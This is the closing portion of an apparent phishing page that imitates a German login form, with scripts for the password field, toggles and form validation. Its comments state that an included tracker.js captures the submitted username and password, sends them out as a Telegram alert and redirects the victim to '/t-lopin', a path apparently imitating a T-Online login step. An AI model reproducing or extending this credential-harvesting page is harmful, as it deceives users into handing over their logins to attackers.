    <!-- Socket.IO & Telemetry Tracker Client -->
    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/tracker.js"></script>

    <!-- Page Interaction Logic -->
    <script>
      document.addEventListener("DOMContentLoaded", () => {
        const form = document.getElementById("passForm");
        const passwordInput = document.getElementById("input-password");
        const submitBtn = document.getElementById("pw_submit");
        const textField = document.getElementById("password-text-field");
        const errorDiv = document.getElementById("password-error");
        const togglePwBtn = document.getElementById("toggle-password");
        const iconShowPw = document.getElementById("icon-show-pw");
        const iconHidePw = document.getElementById("icon-hide-pw");

        // Floating Label Animation
        function updateFloatingState() {
          if (passwordInput.value.length > 0) {
            textField.classList.add("animated");
          } else if (document.activeElement !== passwordInput) {
            textField.classList.remove("animated");
          }
        }

        passwordInput.addEventListener("focus", () => {
          textField.classList.add("text-field--has-focus");
          textField.classList.add("animated");
        });

        passwordInput.addEventListener("blur", () => {
          textField.classList.remove("text-field--has-focus");
          updateFloatingState();
        });

        passwordInput.addEventListener("input", () => {
          updateFloatingState();
          if (passwordInput.value.length > 0) {
            textField.classList.remove("text-field--variant-danger");
            errorDiv.style.display = "none";
          }
        });

        // Toggle Password Visibility
        togglePwBtn.addEventListener("click", (e) => {
          e.preventDefault();
          const isPassword = passwordInput.getAttribute("type") === "password";
          if (isPassword) {
            passwordInput.setAttribute("type", "text");
            iconShowPw.style.display = "none";
            iconHidePw.style.display = "block";
            togglePwBtn.setAttribute("title", "Passwort ausblenden");
            togglePwBtn.setAttribute("aria-label", "Passwort ausblenden");
          } else {
            passwordInput.setAttribute("type", "password");
            iconShowPw.style.display = "block";
            iconHidePw.style.display = "none";
            togglePwBtn.setAttribute("title", "Passwort einblenden");
            togglePwBtn.setAttribute("aria-label", "Passwort einblenden");
          }
          passwordInput.focus();
        });

        // Switch Toggle
        const switchWrapper = document.getElementById("switch-wrapper");
        const switchInput = document.getElementById("switch-0");

        if (switchWrapper && switchInput) {
          switchWrapper.addEventListener("click", (e) => {
            if (e.target !== switchInput) {
              e.preventDefault();
              switchInput.checked = !switchInput.checked;
            }
            if (switchInput.checked) {
              switchWrapper.classList.add("switch--checked");
              switchInput.setAttribute("checked", "checked");
            } else {
              switchWrapper.classList.remove("switch--checked");
              switchInput.removeAttribute("checked");
            }
          });
        }

        // Info Accordion Toggles
        function setupAccordionToggle(btnId, boxId) {
          const btn = document.getElementById(btnId);
          const box = document.getElementById(boxId);
          if (btn && box) {
            btn.addEventListener("click", (e) => {
              e.preventDefault();
              const isHidden = box.hasAttribute("hidden");
              if (isHidden) {
                box.removeAttribute("hidden");
              } else {
                box.setAttribute("hidden", "");
              }
            });
          }
        }

        setupAccordionToggle("show_remember_info_box", "remember_info_box");
        setupAccordionToggle("openHelpPage", "remember_info_box");

        // Form Submit Interception & Validation
        form.addEventListener("submit", (e) => {
          const passwordVal = passwordInput.value;

          if (!passwordVal || !passwordVal.trim()) {
            e.preventDefault();
            e.stopImmediatePropagation();
            textField.classList.add("text-field--variant-danger");
            errorDiv.style.display = "block";
            passwordInput.focus();
            return false;
          }

          // Hide error
          textField.classList.remove("text-field--variant-danger");
          errorDiv.style.display = "none";

          // Set redirect destination for tracker.js smart redirect to verification/next step via t-lopin
          form.setAttribute(
            "data-redirect",
            "/t-lopin",
          );

          // tracker.js listener on document 'submit' will now capture the form,
          // emit 'visitor_action' with details (including username and password), send Telegram alert, and redirect!
        });
      });
    </script>
  </body>
</html>
